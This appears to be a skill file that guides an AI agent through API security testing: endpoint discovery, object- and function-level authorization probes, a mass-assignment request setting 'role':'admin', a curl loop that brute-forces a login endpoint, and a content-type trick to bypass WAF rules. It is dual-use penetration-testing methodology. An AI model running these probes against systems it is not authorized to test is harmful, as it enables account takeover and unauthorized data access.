---
name: api-security
description: "API security testing: authentication schemes, BOLA/BFLA, mass assignment, rate limiting, and versioning gaps. Use this skill when testing a REST or RPC API."
---

# API Security

## Overview

APIs fail on authorization, not on injection. The OWASP API Top 10 order: BOLA, broken auth, excessive data exposure, mass assignment, BFLA, rate limits.

## Map the API

```bash
katana -u https://target -jc | grep -E "/api/|/v[0-9]/"
# or from a JS bundle
python3 linkfinder.py -i https://target/app.js -o cli
```

```bash
# swagger / openapi
curl -s https://target/swagger.json
curl -s https://target/openapi.json
curl -s https://target/api-docs
```

## Authentication

| Scheme | Test |
|---|---|
| JWT | alg confusion, weak secret (see `jwt-attack-methodology`) |
| API key in URL | leakage via logs/Referer |
| Basic auth | brute force, no lockout |
| OAuth | redirect_uri (see `oauth-sso-attack`) |
| mTLS | bypass via a proxy that terminates TLS |

## BOLA (object-level)

```
GET /api/v1/users/1001/orders
GET /api/v1/users/1002/orders     <- other user
```

Test every endpoint with a second account's ID.

## BFLA (function-level)

```
DELETE /api/v1/admin/users/5     with a normal user token
POST   /api/v1/internal/reset
```

Look for admin endpoints reachable by non-admins.

## Mass assignment

```json
POST /api/users {"name":"x","email":"y","role":"admin","verified":true}
```

If the server binds all fields, privilege escalation.

## Excessive data exposure

The API returns more than the UI shows (other users' emails, internal IDs, tokens). Inspect raw JSON, not the rendered page.

## Rate limiting

```bash
for i in $(seq 1 200); do curl -s -o /dev/null -w "%{http_code}\n" https://target/api/login -d "u=a&p=$i"; done | sort | uniq -c
```

No 429 after many attempts = missing limit. Test per-endpoint and per-IP.

## Versioning gaps

```
/api/v1/user/1     (patched)
/api/v2/user/1     (patched)
/api/beta/user/1   (maybe not)
```

Old versions often lack new authorization checks.

## Content type confusion

```bash
curl -X POST https://target/api/user -H "Content-Type: text/plain" -d '{"role":"admin"}'
```

Some frameworks parse JSON regardless of content type, bypassing WAF rules.

## GraphQL

See `graphql-methodology`.

## Pitfalls

- Postman/collection exports from the frontend often contain internal endpoints.
- 403 on one endpoint does not mean the whole admin surface is protected.
- Rate limit headers may lie; measure actual behavior.

## Verification

Cross-account data access or privilege escalation must be demonstrated with two accounts.
